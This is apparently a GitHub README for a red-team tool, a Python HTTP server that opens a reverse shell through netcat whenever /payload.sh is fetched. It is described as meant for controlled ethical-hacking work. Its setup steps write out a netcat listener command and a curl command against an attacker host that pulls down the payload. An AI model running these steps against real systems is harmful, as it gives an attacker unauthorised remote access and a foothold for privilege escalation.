# Red Team HTTP Server with Reverse Shell

## Overview

This red team tool is a Python-based HTTP server that hosts specific payloads for post-exploitation activities. It restricts file access to predefined resources and triggers a reverse shell when a specific payload is accessed. The goal is to allow further privilege escalation by hosting additional scripts that can be retrieved via curl.

## Description

The server only allows access to a specific file (`/payload.sh`). If the file is requested via a GET request, the server triggers a reverse shell connection to a specified attacker machine using `nc` (netcat). This reverse shell could be used for further privilege escalation purposes in a controlled, ethical hacking environment.

The server does the following:
1. It hosts only specific files that are allowed to be accessed (currently only `/payload.sh`).
2. It checks for the requested file and, if it matches `/payload.sh`, triggers a reverse shell connection using `nc`.
3. Any unauthorized access attempts are blocked with a `403 Access Denied` response.

## Requirements

- Python 3.x
- Netcat (`nc`), installed on the machine where this script is running

## Setup

1. Clone this repository:
   git clone https://github.com/Lucas-F913/CDTBRTT.git
3. Run Python server
4. listen on designated port
   nc -lvnp {port}
6. Make target curl http://attackerIP:Port/payload.sh
7. Once connection establish use other directories to grab other tools off the webserver
